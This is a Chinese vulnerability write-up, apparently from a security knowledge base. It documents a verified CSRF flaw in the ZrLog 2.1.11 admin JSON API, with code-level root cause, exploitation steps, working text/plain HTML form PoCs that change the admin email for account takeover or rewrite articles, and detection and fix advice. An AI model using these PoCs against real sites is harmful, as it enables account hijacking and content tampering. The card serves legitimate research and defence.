---
id: web-generic-csrf-zrlog-admin-json-api-text-plain-all-endpoints
title: ZrLog 2.1.11 后台 JSON API 全站无 CSRF 校验：text/plain 表单跨站改邮箱（可接管）与改文章内容
type: scenario
domain: web
path: web/generic/csrf
technique: zrlog-admin-json-api-text-plain-csrf
aliases:
- ZrLog CSRF
- ZrLog 改邮箱 CSRF
- ZrLog 文章更新 CSRF
- FJFinal 无 CSRF 防护
- ZrLog /api/admin/update
- ZrLog /api/admin/article/update
tags:
- web
- csrf
- json
- text-plain
- zrlog
- java
- jfinal
- admin-panel
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
affected_versions: 2.1.11
verification:
  verified_by: verifier-T2-2
  verified_at: '2026-11-07T23:32:33+08:00'
  notes: 已对照 16539 原文与 img/01-26 核对：pom.xml 无 spring-security、web.xml JFinalFilter configClass=com.zrlog.web.config.ZrLogConfig、configRoute 三条路由、AdminRoutes 的 /api/admin 与 /api/admin/article 映射、AdminController.update 的 convertRequestBody+AdminTokenThreadLocal.getUserId()、ArticleController.update→ArticleService.update→save 均与图01-05/16-20 一致；两条 CSRF 实测回显（改邮箱 message=更新个人信息成功、error=0；改文章 error=0 且前台显示 test_csrf111）与图07-11/22-26 一致；无人身数字：affected_versions 2.1.11 与图21 页脚 Version 2.1.11 相符，保留未改。已作一处修正：原卡把 text/plain 表单最终 body 写成省略了开头引号的 JSON，实际浏览器拼为 header:'=value=assets/images/...，已按浏览器 name=value 拼接口径改正，否则会误导复现。作者跳过 XSS 卡（userName 列 15 字符上限导致无法写入可用 payload）与图13-15 结论一致。未验证点：未复跑 CSRF PoC；Cookie 是否 SameSite 未实测。未访问文中 IP/URL。
---

## 一句话结论

ZrLog 2.1.11 没有引入 Spring Security（`pom.xml` 里无 `spring-security` 依赖），后台全部接口由 FJFinal 的 `AdminRoutes` 注册（`/api/admin`、`/api/admin/article`、`/api/admin/website` 等）且整条调用链上没有 CSRF Token 或 Origin/Referer 校验，因此攻击者可用 `enctype="text/plain"` 的 HTML 表单跨站向 `POST /api/admin/update`（改邮箱）与 `POST /api/admin/article/update`（改文章标题/正文）提交 JSON，以受害者管理员身份静默改数据。

## 原理

- **判定入口**：先看 `pom.xml` 是否有 `spring-security`（有则该组件自带 CSRF 过滤），再看 `web.xml` 里 `JFinalFilter` 的 `configClass` 指向 `com.zrlog.web.config.ZrLogConfig`；`ZrLogConfig.configRoute()` 只有 `routes.add("/", ArticleController)`、`routes.add("/install", InstallController)`、`routes.add(new AdminRoutes())` 三条，管理中心的路由全在 `AdminRoutes`。
- **路由到控制器**：`AdminRoutes.config()` 把 `/api/admin` 映射到 `AdminController`、`/api/admin/article` 映射到 `ArticleController`、`/api/admin/website` 映射到 `WebSiteController`。`AdminController.update()` 用 `ZrLogUtil.convertRequestBody(getRequest(), UpdateAdminRequest.class)` 直接把请求体反序列化成 Bean，再 `adminRequest.setUserId(AdminTokenThreadLocal.getUserId())` 调 `userService.update`，全程只依赖 `admin-token` Cookie 鉴权。
- **为什么能跨站**：服务端既不校验 CSRF Token，也不校验 `Origin`/`Referer`（`Referer` 只出现在截图里作为正常请求头），因此任何第三方页面都能触发；`SameSite` 未限制时浏览器会带上 `admin-token`。
- **为什么用 text/plain 表单**：普通表单的 `application/x-www-form-urlencoded` 会把 `{`、`"`、`:` 等字符编码，后端 `convertRequestBody` 无法按 JSON 解析；改成 `enctype="text/plain"` 后浏览器按 `name=value` 原样拼接、Content-Type 为 `text/plain`，而 `convertRequestBody` 只要拿到原始 body 就能解析 JSON，并不强求 `application/json`。
- **多余的 `=`**：表单序列化会在字段名后追加 `=`，所以请求体末尾会多一个 `=`。把需要"吸收"这个 `=` 的片段写进某个字符串字段的值里（如 `"rubbish":"value=false"}` 或把 `header` 的值写成 `value=assets/...gif`），浏览器生成的最终 body 仍是合法 JSON。
- **两条端点的影响差异**：改邮箱可接密码找回/邮箱验证流程实现账号接管；改文章可篡改前台展示内容（`title`/`alias`/`digest`/`content`/`markdown` 全部可写），配合前台对正文的 HTML 渲染可退化为内容注入。

## 触发条件

- 目标为 ZrLog 2.1.11（或同样没有引入 CSRF 防护的版本），管理员已登录且 `admin-token` Cookie 可被跨站请求携带（非 `SameSite=Strict`）。
- 目标接口接受 `text/plain` 请求体并仍按 JSON 解析（`ZrLogUtil.convertRequestBody` 读原始输入流，不校验 Content-Type）。
- 攻击者知道目标地址与一个合法的文章 `id`（可通过前台文章页/链接枚举）。

## 利用步骤

1. 抓一条正常后台请求（如个人信息提交 `POST /api/admin/update`、文章编辑 `POST /api/admin/article/update`），确认只用 Cookie 鉴权、无 CSRF Token、无自定义头校验。
2. 用 Burp 的 Engagement tools → Generate CSRF PoC 生成 `enctype="text/plain"` 表单，把 JSON 放进 `name` 属性，用某个字符串字段吸收末尾的 `=`。
3. 在攻击者站点挂载 PoC，受害者访问后点击/自动提交，浏览器带 `admin-token` 发起跨站 POST。
4. 观察目标回显 `{"message":"更新个人信息成功","error":0}` 或 `{"error":0,...}`，再到后台/前台确认数据已被改。
5. 改邮箱场景：把 `email` 改成攻击者邮箱后走密码找回或邮箱验证流程接管账号；改文章场景：替换 `title`/`content` 做内容篡改。

## PoC

改邮箱（个人信息接口）：

```html
<html><body>
<script>history.pushState('','','/')</script>
<form action="http://target/api/admin/update" method="POST" enctype="text/plain">
  <input type="hidden" name='{"userName":"admin","email":"attacker@evil.com","header":"' value='value=assets/images/default-portrait.gif"}'>
  <input type="submit" value="Submit request">
</form>
</body></html>
```

浏览器最终提交的 body（浏览器按 `name + "=" + value` 拼接，分隔用的 `=` 与末尾多余 `=` 都落在 `header` 的字符串值内部，整体仍是合法 JSON）：

```text
{"userName":"admin","email":"attacker@evil.com","header":"'='value=assets/images/default-portrait.gif"}
```

改文章（`id` 为前台可枚举的文章 ID）：

```html
<html><body>
<form action="http://target/api/admin/article/update" method="POST" enctype="text/plain">
  <input type="hidden" name='{"id":"2","editorType":"markdown","title":"test_csrf111","alias":"test_csrf111","thumbnail":null,"typeId":"1","keywords":null,"digest":"<p>hacked</p>","canComment":false,"recommended":false,"privacy":false,"content":"<p>test_csrf</p>\n","markdown":"test_csrf111","rubbish":"' value="'false"}'>
  <input type="submit" value="Submit request">
</form>
</body></html>
```

成功回显：

```json
{"thumbnail":null,"digest":"<p>hacked</p>","alias":"test_csrf","id":2,"message":null,"error":0}
```

## 变体与关联

- 变体：文章更新接口的 `id` 可枚举，因此可批量改全部文章；同一套 `AdminRoutes` 下的 `/api/admin/link`、`/api/admin/comment`、`/api/admin/type`、`/api/admin/nav`、`/api/admin/website`、`/api/admin/template`、`/api/admin/upload` 都走同一套无 CSRF 的控制器，可逐个试探状态变更方法。
- 变体：`fetch` + `Content-Type: text/plain` 的"简单请求"可绕预检，但受 CORS 限制无法读响应；表单方式不需要 CORS，只需 Cookie 能跨站携带。
- 关联：[[web-generic-csrf-json-text-plain-form-enctype]]（`enctype=text/plain` 直发 JSON 与 `'value='` 吸收等号的通用原理）、[[web-generic-csrf-missing-token-state-changing-endpoint]]（无 Token 状态变更接口的通用判定）、[[web-generic-xss-zrlog-admin-otherwebsiteinfo-stored-config]]（同产品后台配置接口的存储型 XSS，可与其组合成 CSRF→XSS）。
- 边界：目标加上 CSRF Token、严格校验 `Origin`/`Referer`、或 Cookie 为 `SameSite=Strict` 时失效；接口若强制要求 `application/json`（触发预检）也会阻断表单方式。

## 检测与防御

- 修复：所有后台状态变更接口加 CSRF Token（同步器或双提交 Cookie），并校验 `Origin`/`Referer` 必须存在且与本站精确匹配，缺失或跨站一律拒绝。
- 修复：服务端对写接口强制 `Content-Type: application/json` 并拒绝 `text/plain`，同时校验自定义头（如 `X-Requested-With`）；`ZrLogUtil.convertRequestBody` 不应无条件接收原始流。
- 加固：`admin-token` Cookie 设 `SameSite=Lax/Strict`、`Secure`、`HttpOnly`；敏感操作（改邮箱、改密码）要求再次输入原密码。
- 检测：后台写请求的 Content-Type 为 `text/plain`、`Origin`/`Referer` 缺失或指向外部域、请求体为 JSON 却由表单提交；同一会话短时间内出现来自不同来源页的写操作。
